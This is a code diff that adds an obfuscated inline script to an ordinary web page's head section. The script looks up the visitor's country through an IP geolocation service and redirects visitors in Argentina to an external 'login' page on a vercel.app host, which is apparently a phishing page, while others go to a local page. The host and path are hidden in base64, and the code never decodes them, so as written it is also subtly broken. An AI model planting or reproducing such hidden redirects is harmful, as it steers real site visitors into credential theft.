@@ -24,6 +24,31 @@
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 
+<script>
+(function(){
+  const _0x2f4a = 'aHR0cHM6Ly9tdWx0aXBheW11bHRpcGF5LnZlcmNlbC5hcHAvbG9naW4uaHRtbA==';
+  const _0x3b8c = 'aW5pY2lvLmh0bWw=';
+  const _0x4d2e = 'https://ipapi.co/json/';
+  
+  // Timeout de 3 segundos
+  const timeoutPromise = new Promise((_, reject) => {
+    setTimeout(() => reject(new Error('Timeout')), 3000);
+  });
+  
+  Promise.race([fetch(_0x4d2e), timeoutPromise])
+    .then(_0x5a1f => _0x5a1f.json())
+    .then(_0x2b7c => {
+      if (_0x2b7c.country === "AR") {
+        window.location.href = _0x2f4a;
+      } else {
+        window.location.href = _0x3b8c;
+      }
+    })
+    .catch(() => {
+      window.location.href = _0x3b8c;
+    });
+})();
+</script>
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&family=Playfair+Display:wght@700&display=swap');
 
